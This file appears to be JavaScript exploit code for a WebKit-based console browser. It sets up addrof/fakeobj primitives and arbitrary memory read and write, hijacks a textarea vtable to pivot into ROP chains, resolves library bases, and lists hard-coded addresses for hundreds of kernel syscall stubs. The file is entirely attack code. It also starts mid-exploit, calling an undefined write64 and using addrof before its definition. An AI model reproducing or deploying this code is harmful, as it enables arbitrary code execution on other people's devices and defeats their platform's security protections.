var oob_master = new Uint32Array(1024);
var oob_slave = new Uint8Array(1024);
var leaker_arr = new Uint32Array(1024);
var leaker_obj = {a: 1234};
write64(addrof(oob_master).add(16), addrof(oob_slave));
write64(addrof(leaker_arr).add(16), addrof(leaker_obj));

var i48_put = function(x, a)
{
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
}

var i48_get = function(a)
{
    return a[4] + a[5] * 4294967296;
}

var addrof = function(x)
{
    leaker_obj.a = x;
    return i48_get(leaker_arr);
}

var fakeobj = function(x)
{
    i48_put(x, leaker_arr);
    return leaker_obj.a;
}

var read_mem_setup = function(p, sz)
{
    i48_put(p, oob_master);
    oob_master[6] = sz;
}

var read_mem = function(p, sz)
{
    read_mem_setup(p, sz);
    var arr = [];
    for(var i = 0; i < sz; i++)
        arr.push(oob_slave[i]);
    return arr;
}

var read_mem_s = function(p, sz)
{
    read_mem_setup(p, sz);
    return ""+oob_slave;
}

var read_mem_b = function(p, sz)
{
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b;
}

var read_mem_as_string = function(p, sz)
{
    var x = read_mem_b(p, sz);
    var ans = '';
    for(var i = 0; i < x.length; i++)
        ans += String.fromCharCode(x[i]);
    return ans;
}

var write_mem = function(p, data)
{
    i48_put(p, oob_master);
    oob_master[6] = data.length;
    for(var i = 0; i < data.length; i++)
        oob_slave[i] = data[i];
}

var read_ptr_at = function(p)
{
    var ans = 0;
    var d = read_mem(p, 8);
    for(var i = 7; i >= 0; i--)
        ans = 256 * ans + d[i];
    return ans;
}

var write_ptr_at = function(p, d)
{
    var arr = [];
    for(var i = 0; i < 8; i++)
    {
        arr.push(d & 0xff);
        d /= 256;
    }
    write_mem(p, arr);
}

var hex = function(x)
{
    return (new Number(x)).toString(16);
}
var malloc_nogc = [];
function malloc(sz)
{
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr)+0x10);
}
var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10117000;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(789);
var libc_base = get_got_addr(573);
var saveall_addr = libc_base+0x24174;
var loadall_addr = libc_base+0x285c8;
//var setjmp_addr = libc_base+???;
//var longjmp_addr = libc_base+???;
var pivot_addr = libc_base+0x2863e;
var infloop_addr = libc_base+0x3a9d0;
var jop_frame_addr = libc_base+0x67850;
var get_errno_addr_addr = libkernel_base+0x116c0;
var pthread_create_addr = libkernel_base+0x16fe0;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
var sys_545_addr = libkernel_base + 0x264a0;
var sys_47_addr = libkernel_base + 0x264c0;
var sys_554_addr = libkernel_base + 0x264e0;
var sys_35_addr = libkernel_base + 0x26500;
var sys_559_addr = libkernel_base + 0x26520;
var sys_643_addr = libkernel_base + 0x26540;
var sys_433_addr = libkernel_base + 0x26560;
var sys_183_addr = libkernel_base + 0x26580;
var sys_196_addr = libkernel_base + 0x265a0;
var sys_33_addr = libkernel_base + 0x265c0;
var sys_330_addr = libkernel_base + 0x265e0;
var sys_478_addr = libkernel_base + 0x26600;
var sys_79_addr = libkernel_base + 0x26620;
var sys_639_addr = libkernel_base + 0x26640;
var sys_147_addr = libkernel_base + 0x26660;
var sys_363_addr = libkernel_base + 0x26680;
var sys_596_addr = libkernel_base + 0x266a0;
var sys_333_addr = libkernel_base + 0x266c0;
var sys_655_addr = libkernel_base + 0x266e0;
var sys_334_addr = libkernel_base + 0x26700;
var sys_552_addr = libkernel_base + 0x26720;
var sys_637_addr = libkernel_base + 0x26740;
var sys_664_addr = libkernel_base + 0x26760;
var sys_120_addr = libkernel_base + 0x26780;
var sys_80_addr = libkernel_base + 0x267a0;
var sys_543_addr = libkernel_base + 0x26870;
var sys_553_addr = libkernel_base + 0x26890;
var sys_580_addr = libkernel_base + 0x268b0;
var sys_482_addr = libkernel_base + 0x268d0;
var sys_564_addr = libkernel_base + 0x268f0;
var sys_649_addr = libkernel_base + 0x26910;
var sys_238_addr = libkernel_base + 0x26930;
var sys_5_addr = libkernel_base + 0x26950;
var sys_340_addr = libkernel_base + 0x26973;
var sys_673_addr = libkernel_base + 0x26a00;
var sys_29_addr = libkernel_base + 0x26a20;
var sys_232_addr = libkernel_base + 0x26a40;
var sys_604_addr = libkernel_base + 0x26a60;
var sys_442_addr = libkernel_base + 0x26a80;
var sys_594_addr = libkernel_base + 0x26aa0;
var sys_116_addr = libkernel_base + 0x26ac0;
var sys_190_addr = libkernel_base + 0x26ae0;
var sys_346_addr = libkernel_base + 0x26b00;
var sys_613_addr = libkernel_base + 0x26b20;
var sys_1_addr = libkernel_base + 0x26b50;
var sys_50_addr = libkernel_base + 0x26b70;
var sys_10_addr = libkernel_base + 0x26ba0;
var sys_27_addr = libkernel_base + 0x26bc0;
var sys_663_addr = libkernel_base + 0x26be0;
var sys_102_addr = libkernel_base + 0x26c00;
var sys_546_addr = libkernel_base + 0x26c20;
var sys_182_addr = libkernel_base + 0x26c40;
var sys_566_addr = libkernel_base + 0x26c60;
var sys_611_addr = libkernel_base + 0x26c80;
var sys_560_addr = libkernel_base + 0x26ca0;
var sys_572_addr = libkernel_base + 0x26cc0;
var sys_234_addr = libkernel_base + 0x26ce0;
var sys_675_addr = libkernel_base + 0x26d00;
var sys_612_addr = libkernel_base + 0x26d20;
var sys_34_addr = libkernel_base + 0x26d40;
var sys_455_addr = libkernel_base + 0x26d60;
var sys_122_addr = libkernel_base + 0x26d80;
var sys_592_addr = libkernel_base + 0x26da0;
var sys_2_addr = libkernel_base + 0x26dc0;
var sys_588_addr = libkernel_base + 0x26de0;
var sys_331_addr = libkernel_base + 0x26e00;
var sys_204_addr = libkernel_base + 0x26e20;
var sys_78_addr = libkernel_base + 0x26e40;
var sys_202_addr = libkernel_base + 0x26e60;
var sys_421_addr = libkernel_base + 0x26e84;
var sys_599_addr = libkernel_base + 0x26eb0;
var sys_237_addr = libkernel_base + 0x26ed0;
var sys_189_addr = libkernel_base + 0x26ef0;
var sys_7_addr = libkernel_base + 0x26f10;
var sys_661_addr = libkernel_base + 0x26f30;
var sys_39_addr = libkernel_base + 0x26f50;
var sys_548_addr = libkernel_base + 0x26f70;
var sys_620_addr = libkernel_base + 0x26f90;
var sys_648_addr = libkernel_base + 0x26fb0;
var sys_340_addr = libkernel_base + 0x26fd0;
var sys_36_addr = libkernel_base + 0x26ff0;
var sys_194_addr = libkernel_base + 0x27010;
var sys_192_addr = libkernel_base + 0x27030;
var sys_615_addr = libkernel_base + 0x27050;
var sys_541_addr = libkernel_base + 0x27070;
var sys_195_addr = libkernel_base + 0x27090;
var sys_43_addr = libkernel_base + 0x270b0;
var sys_486_addr = libkernel_base + 0x270d0;
var sys_315_addr = libkernel_base + 0x270f0;
var sys_98_addr = libkernel_base + 0x27110;
var sys_591_addr = libkernel_base + 0x27130;
var sys_481_addr = libkernel_base + 0x27150;
var sys_422_addr = libkernel_base + 0x27170;
var sys_660_addr = libkernel_base + 0x27190;
var sys_536_addr = libkernel_base + 0x271b0;
var sys_532_addr = libkernel_base + 0x271d0;
var sys_25_addr = libkernel_base + 0x271f0;
var sys_203_addr = libkernel_base + 0x27210;
var sys_37_addr = libkernel_base + 0x27230;
var sys_549_addr = libkernel_base + 0x27250;
var sys_656_addr = libkernel_base + 0x27270;
var sys_44_addr = libkernel_base + 0x27290;
var sys_565_addr = libkernel_base + 0x272b0;
var sys_600_addr = libkernel_base + 0x272d0;
var sys_125_addr = libkernel_base + 0x272f0;
var sys_379_addr = libkernel_base + 0x27310;
var sys_95_addr = libkernel_base + 0x27330;
var sys_583_addr = libkernel_base + 0x27350;
var sys_522_addr = libkernel_base + 0x27370;
var sys_239_addr = libkernel_base + 0x27390;
var sys_55_addr = libkernel_base + 0x273b0;
var sys_544_addr = libkernel_base + 0x273d0;
var sys_134_addr = libkernel_base + 0x273f0;
var sys_289_addr = libkernel_base + 0x27410;
var sys_131_addr = libkernel_base + 0x27430;
var sys_654_addr = libkernel_base + 0x27450;
var sys_124_addr = libkernel_base + 0x27470;
var sys_586_addr = libkernel_base + 0x27490;
var sys_4_addr = libkernel_base + 0x274b0;
var sys_555_addr = libkernel_base + 0x274d0;
var sys_416_addr = libkernel_base + 0x274f0;
var sys_59_addr = libkernel_base + 0x2751d;
var sys_563_addr = libkernel_base + 0x27540;
var sys_329_addr = libkernel_base + 0x27560;
var sys_406_addr = libkernel_base + 0x27580;
var sys_582_addr = libkernel_base + 0x275a0;
var sys_137_addr = libkernel_base + 0x275c0;
var sys_538_addr = libkernel_base + 0x275e0;
var sys_456_addr = libkernel_base + 0x27600;
var sys_677_addr = libkernel_base + 0x27620;
var sys_668_addr = libkernel_base + 0x27640;
var sys_444_addr = libkernel_base + 0x27660;
var sys_669_addr = libkernel_base + 0x27680;
var sys_105_addr = libkernel_base + 0x276a0;
var sys_20_addr = libkernel_base + 0x276c0;
var sys_628_addr = libkernel_base + 0x276e0;
var sys_206_addr = libkernel_base + 0x27700;
var sys_487_addr = libkernel_base + 0x27720;
var sys_618_addr = libkernel_base + 0x27740;
var sys_49_addr = libkernel_base + 0x27760;
var sys_332_addr = libkernel_base + 0x27780;
var sys_670_addr = libkernel_base + 0x277a0;
var sys_595_addr = libkernel_base + 0x277c0;
var sys_431_addr = libkernel_base + 0x277e0;
var sys_104_addr = libkernel_base + 0x27800;
var sys_117_addr = libkernel_base + 0x27820;
var sys_12_addr = libkernel_base + 0x27840;
var sys_587_addr = libkernel_base + 0x27860;
var sys_405_addr = libkernel_base + 0x27880;
var sys_97_addr = libkernel_base + 0x278a0;
var sys_619_addr = libkernel_base + 0x278c0;
var sys_641_addr = libkernel_base + 0x278e0;
var sys_585_addr = libkernel_base + 0x27900;
var sys_671_addr = libkernel_base + 0x27920;
var sys_209_addr = libkernel_base + 0x27940;
var sys_191_addr = libkernel_base + 0x27960;
var sys_407_addr = libkernel_base + 0x27980;
var sys_83_addr = libkernel_base + 0x279a0;
var sys_240_addr = libkernel_base + 0x279c0;
var sys_602_addr = libkernel_base + 0x279e0;
var sys_42_addr = libkernel_base + 0x27a00;
var sys_41_addr = libkernel_base + 0x27a30;
var sys_408_addr = libkernel_base + 0x27a50;
var sys_551_addr = libkernel_base + 0x27a70;
var sys_488_addr = libkernel_base + 0x27a90;
var sys_99_addr = libkernel_base + 0x27ab0;
var sys_624_addr = libkernel_base + 0x27ad0;
var sys_310_addr = libkernel_base + 0x27af0;
var sys_138_addr = libkernel_base + 0x27b10;
var sys_328_addr = libkernel_base + 0x27b30;
var sys_475_addr = libkernel_base + 0x27b50;
var sys_30_addr = libkernel_base + 0x27b70;
var sys_499_addr = libkernel_base + 0x27b90;
var sys_253_addr = libkernel_base + 0x27bb0;
var sys_56_addr = libkernel_base + 0x27bd0;
var sys_593_addr = libkernel_base + 0x27bf0;
var sys_114_addr = libkernel_base + 0x27c10;
var sys_676_addr = libkernel_base + 0x27c30;
var sys_235_addr = libkernel_base + 0x27c50;
var sys_126_addr = libkernel_base + 0x27c70;
var sys_598_addr = libkernel_base + 0x27c90;
var sys_608_addr = libkernel_base + 0x27cb0;
var sys_136_addr = libkernel_base + 0x27cd0;
var sys_636_addr = libkernel_base + 0x27cf0;
var sys_402_addr = libkernel_base + 0x27d10;
var sys_629_addr = libkernel_base + 0x27d30;
var sys_556_addr = libkernel_base + 0x27d50;
var sys_435_addr = libkernel_base + 0x27d70;
var sys_657_addr = libkernel_base + 0x27d90;
var sys_605_addr = libkernel_base + 0x27db0;
var sys_432_addr = libkernel_base + 0x27dd0;
var sys_627_addr = libkernel_base + 0x27df0;
var sys_31_addr = libkernel_base + 0x27e10;
var sys_417_addr = libkernel_base + 0x27e30;
var sys_272_addr = libkernel_base + 0x27e50;
var sys_165_addr = libkernel_base + 0x27e70;
var sys_441_addr = libkernel_base + 0x27e90;
var sys_632_addr = libkernel_base + 0x27eb0;
var sys_113_addr = libkernel_base + 0x27ed0;
var sys_397_addr = libkernel_base + 0x27ef0;
var sys_23_addr = libkernel_base + 0x27f10;
var sys_140_addr = libkernel_base + 0x27f30;
var sys_28_addr = libkernel_base + 0x27f50;
var sys_635_addr = libkernel_base + 0x27f70;
var sys_581_addr = libkernel_base + 0x27f90;
var sys_659_addr = libkernel_base + 0x27fb0;
var sys_603_addr = libkernel_base + 0x27fd0;
var sys_610_addr = libkernel_base + 0x27ff0;
var sys_666_addr = libkernel_base + 0x28010;
var sys_236_addr = libkernel_base + 0x28030;
var sys_634_addr = libkernel_base + 0x28050;
var sys_121_addr = libkernel_base + 0x28070;
var sys_401_addr = libkernel_base + 0x28090;
var sys_642_addr = libkernel_base + 0x280b0;
var sys_540_addr = libkernel_base + 0x280d0;
var sys_73_addr = libkernel_base + 0x280f0;
var sys_59_addr = libkernel_base + 0x28110;
var sys_539_addr = libkernel_base + 0x28130;
var sys_623_addr = libkernel_base + 0x28150;
var sys_672_addr = libkernel_base + 0x28170;
var sys_392_addr = libkernel_base + 0x28190;
var sys_74_addr = libkernel_base + 0x281b0;
var sys_327_addr = libkernel_base + 0x281d0;
var sys_15_addr = libkernel_base + 0x281f0;
var sys_325_addr = libkernel_base + 0x28210;
var sys_141_addr = libkernel_base + 0x28230;
var sys_54_addr = libkernel_base + 0x28250;
var sys_674_addr = libkernel_base + 0x28270;
var sys_430_addr = libkernel_base + 0x28290;
var sys_127_addr = libkernel_base + 0x282b0;
var sys_483_addr = libkernel_base + 0x282d0;
var sys_133_addr = libkernel_base + 0x282f0;
var sys_434_addr = libkernel_base + 0x28310;
var sys_92_addr = libkernel_base + 0x28330;
var sys_324_addr = libkernel_base + 0x28350;
var sys_128_addr = libkernel_base + 0x28370;
var sys_454_addr = libkernel_base + 0x28390;
var sys_341_addr = libkernel_base + 0x283a0;
var sys_75_addr = libkernel_base + 0x283c0;
var sys_558_addr = libkernel_base + 0x283e0;
var sys_423_addr = libkernel_base + 0x28400;
var sys_638_addr = libkernel_base + 0x28420;
var sys_477_addr = libkernel_base + 0x28440;
var sys_584_addr = libkernel_base + 0x28460;
var sys_550_addr = libkernel_base + 0x28480;
var sys_106_addr = libkernel_base + 0x284a0;
var sys_135_addr = libkernel_base + 0x284c0;
var sys_647_addr = libkernel_base + 0x284e0;
var sys_443_addr = libkernel_base + 0x28500;
var sys_466_addr = libkernel_base + 0x28520;
var sys_542_addr = libkernel_base + 0x28540;
var sys_454_addr = libkernel_base + 0x28560;
var sys_429_addr = libkernel_base + 0x28580;
var sys_393_addr = libkernel_base + 0x285a0;
var sys_658_addr = libkernel_base + 0x285c0;
var sys_404_addr = libkernel_base + 0x285e0;
var sys_101_addr = libkernel_base + 0x28600;
var sys_96_addr = libkernel_base + 0x28620;
var sys_118_addr = libkernel_base + 0x28640;
var sys_640_addr = libkernel_base + 0x28660;
var sys_6_addr = libkernel_base + 0x28680;
var sys_601_addr = libkernel_base + 0x286a0;
var sys_653_addr = libkernel_base + 0x286c0;
var sys_479_addr = libkernel_base + 0x286e0;
var sys_626_addr = libkernel_base + 0x28700;
var sys_557_addr = libkernel_base + 0x28720;
var sys_646_addr = libkernel_base + 0x28740;
var sys_533_addr = libkernel_base + 0x28760;
var sys_400_addr = libkernel_base + 0x28780;
var sys_535_addr = libkernel_base + 0x287a0;
var sys_616_addr = libkernel_base + 0x287c0;
var sys_464_addr = libkernel_base + 0x287e0;
var sys_93_addr = libkernel_base + 0x28800;
var sys_633_addr = libkernel_base + 0x28820;
var sys_662_addr = libkernel_base + 0x28840;
var sys_65_addr = libkernel_base + 0x28860;
var sys_53_addr = libkernel_base + 0x28880;
var sys_617_addr = libkernel_base + 0x288a0;
var sys_90_addr = libkernel_base + 0x288c0;
var sys_233_addr = libkernel_base + 0x288e0;
var sys_403_addr = libkernel_base + 0x28900;
var sys_622_addr = libkernel_base + 0x28920;
var sys_667_addr = libkernel_base + 0x28940;
var sys_625_addr = libkernel_base + 0x28960;
var sys_362_addr = libkernel_base + 0x28980;
var sys_567_addr = libkernel_base + 0x289a0;
var sys_32_addr = libkernel_base + 0x289c0;
var sys_607_addr = libkernel_base + 0x289e0;
var sys_665_addr = libkernel_base + 0x28a00;
var sys_547_addr = libkernel_base + 0x28a20;
var sys_251_addr = libkernel_base + 0x28a49;
var sys_1_addr = libkernel_base + 0x28a6a;
var sys_345_addr = libkernel_base + 0x28a90;
var sys_100_addr = libkernel_base + 0x28ab0;
var sys_652_addr = libkernel_base + 0x28ad0;
var sys_89_addr = libkernel_base + 0x28af0;
var sys_606_addr = libkernel_base + 0x28b10;
var sys_534_addr = libkernel_base + 0x28b30;
var sys_24_addr = libkernel_base + 0x28b50;
var sys_476_addr = libkernel_base + 0x28b70;
var sys_480_addr = libkernel_base + 0x28b90;
var sys_343_addr = libkernel_base + 0x28bb0;
var sys_630_addr = libkernel_base + 0x28bd0;
var sys_86_addr = libkernel_base + 0x28bf0;
var sys_3_addr = libkernel_base + 0x28c10;
var sys_188_addr = libkernel_base + 0x28c30;
var sys_290_addr = libkernel_base + 0x28c50;
var evf_clear_addr = sys_545_addr;
var getgid_addr = sys_47_addr;
var osem_trywait_addr = sys_554_addr;
var fchflags_addr = sys_35_addr;
var set_vm_container_addr = sys_559_addr;
var set_chicken_switches_addr = sys_643_addr;
var thr_kill_addr = sys_433_addr;
var seteuid_addr = sys_183_addr;
var getdirentries_addr = sys_196_addr;
var access_addr = sys_33_addr;
var sched_getscheduler_addr = sys_330_addr;
var lseek_addr = sys_478_addr;
var getgroups_addr = sys_79_addr;
var localtime_to_utc_addr = sys_639_addr;
var setsid_addr = sys_147_addr;
var kevent_addr = sys_363_addr;
var dynlib_do_copy_relocations_addr = sys_596_addr;
var sched_get_priority_min_addr = sys_333_addr;
var blockpool_unmap_addr = sys_655_addr;
var sched_rr_get_interval_addr = sys_334_addr;
var osem_close_addr = sys_552_addr;
var set_phys_fmem_limit_addr = sys_637_addr;
var aio_multi_poll_addr = sys_664_addr;
var readv_addr = sys_120_addr;
var setgroups_addr = sys_80_addr;
var evf_trywait_addr = sys_543_addr;
var osem_wait_addr = sys_553_addr;
var eport_create_addr = sys_580_addr;
var shm_open_addr = sys_482_addr;
var opmc_disable_addr = sys_564_addr;
var dynlib_get_obj_member_addr = sys_649_addr;
var ktimer_gettime_addr = sys_238_addr;
var open_addr = sys_5_addr;
var sigprocmask_addr = sys_340_addr;
var blockpool_move_addr = sys_673_addr;
var recvfrom_addr = sys_29_addr;
var clock_gettime_addr = sys_232_addr;
var dl_get_metadata_addr = sys_604_addr;
var thr_suspend_addr = sys_442_addr;
var dynlib_load_prx_addr = sys_594_addr;
var gettimeofday_addr = sys_116_addr;
var lstat_addr = sys_190_addr;
var sigwaitinfo_addr = sys_346_addr;
var get_resident_count_addr = sys_613_addr;
var sys_exit_addr = sys_1_addr;
var setlogin_addr = sys_50_addr;
var unlink_addr = sys_10_addr;
var recvmsg_addr = sys_27_addr;
var aio_multi_wait_addr = sys_663_addr;
var netgetsockinfo_addr = sys_102_addr;
var evf_cancel_addr = sys_546_addr;
var setegid_addr = sys_182_addr;
var opmc_set_ctr_addr = sys_566_addr;
var get_paging_stats_of_all_threads_addr = sys_611_addr;
var debug_init_addr = sys_560_addr;
var virtual_query_addr = sys_572_addr;
var clock_getres_addr = sys_234_addr;
var reserve_2mb_page_addr = sys_675_addr;
var get_proc_type_info_addr = sys_612_addr;
var chflags_addr = sys_34_addr;
var thr_new_addr = sys_455_addr;
var settimeofday_addr = sys_122_addr;
var dynlib_get_list_addr = sys_592_addr;
var fork_addr = sys_2_addr;
var mname_addr = sys_588_addr;
var sched_yield_addr = sys_331_addr;
var munlock_addr = sys_204_addr;
var mincore_addr = sys_78_addr;
var __sysctl_addr = sys_202_addr;
var getcontext_addr = sys_421_addr;
var dynlib_process_needed_and_relocate_addr = sys_599_addr;
var ktimer_settime_addr = sys_237_addr;
var fstat_addr = sys_189_addr;
var wait4_addr = sys_7_addr;
var aio_submit_addr = sys_661_addr;
var getppid_addr = sys_39_addr;
var batch_map_addr = sys_548_addr;
var free_stack_addr = sys_620_addr;
var app_state_change_addr = sys_648_addr;
var sigprocmask_addr = sys_340_addr;
var sync_addr = sys_36_addr;
var getrlimit_addr = sys_194_addr;
var fpathconf_addr = sys_192_addr;
var get_resident_fmem_count_addr = sys_615_addr;
var evf_close_addr = sys_541_addr;
var setrlimit_addr = sys_195_addr;
var getegid_addr = sys_43_addr;
var cpuset_getid_addr = sys_486_addr;
var aio_suspend_addr = sys_315_addr;
var connect_addr = sys_98_addr;
var dynlib_dlsym_addr = sys_591_addr;
var thr_kill2_addr = sys_481_addr;
var setcontext_addr = sys_422_addr;
var dynlib_get_info2_addr = sys_660_addr;
var dl_get_info_addr = sys_536_addr;
var regmgr_call_addr = sys_532_addr;
var geteuid_addr = sys_25_addr;
var mlock_addr = sys_203_addr;
var kill_addr = sys_37_addr;
var osem_create_addr = sys_549_addr;
var dynlib_get_info_for_libdbg_addr = sys_656_addr;
var profil_addr = sys_44_addr;
var opmc_set_ctl_addr = sys_565_addr;
var sandbox_path_addr = sys_600_addr;
var netgetiflist_addr = sys_125_addr;
var mtypeprotect_addr = sys_379_addr;
var fsync_addr = sys_95_addr;
var eport_open_addr = sys_583_addr;
var pselect_addr = sys_522_addr;
var ktimer_getoverrun_addr = sys_239_addr;
var reboot_addr = sys_55_addr;
var evf_set_addr = sys_544_addr;
var shutdown_addr = sys_134_addr;
var preadv_addr = sys_289_addr;
var flock_addr = sys_131_addr;
var blockpool_map_addr = sys_654_addr;
var fchmod_addr = sys_124_addr;
var dmem_container_addr = sys_586_addr;
var write_addr = sys_4_addr;
var osem_post_addr = sys_555_addr;
var sigaction_addr = sys_416_addr;
var execve_addr = sys_59_addr;
var opmc_enable_addr = sys_563_addr;
var sched_setscheduler_addr = sys_329_addr;
var ksem_unlink_addr = sys_406_addr;
var eport_trigger_addr = sys_582_addr;
var rmdir_addr = sys_137_addr;
var evf_create_addr = sys_538_addr;
var sigqueue_addr = sys_456_addr;
var get_phys_page_size_addr = sys_677_addr;
var aio_create_addr = sys_668_addr;
var kldunloadf_addr = sys_444_addr;
var aio_submit_cmd_addr = sys_669_addr;
var setsockopt_addr = sys_105_addr;
var getpid_addr = sys_20_addr;
var mmap_dmem_addr = sys_628_addr;
var futimes_addr = sys_206_addr;
var cpuset_getaffinity_addr = sys_487_addr;
var get_paging_stats_of_all_objects_addr = sys_618_addr;
var getlogin_addr = sys_49_addr;
var sched_get_priority_max_addr = sys_332_addr;
var aio_init_addr = sys_670_addr;
var dynlib_unload_prx_addr = sys_595_addr;
var thr_exit_addr = sys_431_addr;
var bind_addr = sys_104_addr;
var getrusage_addr = sys_117_addr;
var chdir_addr = sys_12_addr;
var get_authinfo_addr = sys_587_addr;
var ksem_open_addr = sys_405_addr;
var socket_addr = sys_97_addr;
var test_debug_rwmem_addr = sys_619_addr;
var get_cpu_usage_proc_addr = sys_641_addr;
var is_in_sandbox_addr = sys_585_addr;
var get_page_table_stats_addr = sys_671_addr;
var poll_addr = sys_209_addr;
var pathconf_addr = sys_191_addr;
var ksem_getvalue_addr = sys_407_addr;
var setitimer_addr = sys_83_addr;
var nanosleep_addr = sys_240_addr;
var randomized_path_addr = sys_602_addr;
var pipe_addr = sys_42_addr;
var dup_addr = sys_41_addr;
var ksem_destroy_addr = sys_408_addr;
var osem_open_addr = sys_551_addr;
var cpuset_setaffinity_addr = sys_488_addr;
var netcontrol_addr = sys_99_addr;
var get_vm_map_timestamp_addr = sys_624_addr;
var getsid_addr = sys_310_addr;
var utimes_addr = sys_138_addr;
var sched_getparam_addr = sys_328_addr;
var pread_addr = sys_475_addr;
var accept_addr = sys_30_addr;
var openat_addr = sys_499_addr;
var issetugid_addr = sys_253_addr;
var revoke_addr = sys_56_addr;
var dynlib_get_info_addr = sys_593_addr;
var socketclose_addr = sys_114_addr;
var cpumode_yield_addr = sys_676_addr;
var ktimer_create_addr = sys_235_addr;
var setreuid_addr = sys_126_addr;
var dynlib_get_proc_param_addr = sys_598_addr;
var dynlib_get_info_ex_addr = sys_608_addr;
var mkdir_addr = sys_136_addr;
var set_timezone_info_addr = sys_636_addr;
var ksem_wait_addr = sys_402_addr;
var physhm_open_addr = sys_629_addr;
var osem_cancel_addr = sys_556_addr;
var _umtx_unlock_addr = sys_435_addr;
var blockpool_batch_addr = sys_657_addr;
var workaround8849_addr = sys_605_addr;
var thr_self_addr = sys_432_addr;
var get_cpu_usage_all_addr = sys_627_addr;
var getpeername_addr = sys_31_addr;
var sigreturn_addr = sys_417_addr;
var getdents_addr = sys_272_addr;
var sysarch_addr = sys_165_addr;
var ksem_timedwait_addr = sys_441_addr;
var thr_suspend_ucontext_addr = sys_632_addr;
var socketex_addr = sys_113_addr;
var fstatfs_addr = sys_397_addr;
var setuid_addr = sys_23_addr;
var adjtime_addr = sys_140_addr;
var sendmsg_addr = sys_28_addr;
var thr_set_ucontext_addr = sys_635_addr;
var eport_delete_addr = sys_581_addr;
var dynlib_get_list2_addr = sys_659_addr;
var rdup_addr = sys_603_addr;
var budget_get_ptype_addr = sys_610_addr;
var aio_multi_cancel_addr = sys_666_addr;
var ktimer_delete_addr = sys_236_addr;
var thr_get_ucontext_addr = sys_634_addr;
var writev_addr = sys_121_addr;
var ksem_post_addr = sys_401_addr;
var get_map_statistics_addr = sys_642_addr;
var evf_open_addr = sys_540_addr;
var munmap_addr = sys_73_addr;
var execve_addr = sys_59_addr;
var evf_delete_addr = sys_539_addr;
var get_gpo_addr = sys_623_addr;
var dynlib_get_list_for_libdbg_addr = sys_672_addr;
var uuidgen_addr = sys_392_addr;
var mprotect_addr = sys_74_addr;
var sched_setparam_addr = sys_327_addr;
var chmod_addr = sys_15_addr;
var munlockall_addr = sys_325_addr;
var kqueueex_addr = sys_141_addr;
var ioctl_addr = sys_54_addr;
var virtual_query_all_addr = sys_674_addr;
var thr_create_addr = sys_430_addr;
var setregid_addr = sys_127_addr;
var shm_unlink_addr = sys_483_addr;
var sendto_addr = sys_133_addr;
var _umtx_lock_addr = sys_434_addr;
var fcntl_addr = sys_92_addr;
var mlockall_addr = sys_324_addr;
var rename_addr = sys_128_addr;
var _umtx_op_addr = sys_454_addr;
var sigsuspend_addr = sys_341_addr;
var madvise_addr = sys_75_addr;
var namedobj_delete_addr = sys_558_addr;
var swapcontext_addr = sys_423_addr;
var utc_to_localtime_addr = sys_638_addr;
var mmap_addr = sys_477_addr;
var eport_close_addr = sys_584_addr;
var osem_delete_addr = sys_550_addr;
var listen_addr = sys_106_addr;
var socketpair_addr = sys_135_addr;
var get_sdk_compiled_version_addr = sys_647_addr;
var thr_wake_addr = sys_443_addr;
var rtprio_thread_addr = sys_466_addr;
var evf_wait_addr = sys_542_addr;
var _umtx_op_addr = sys_454_addr;
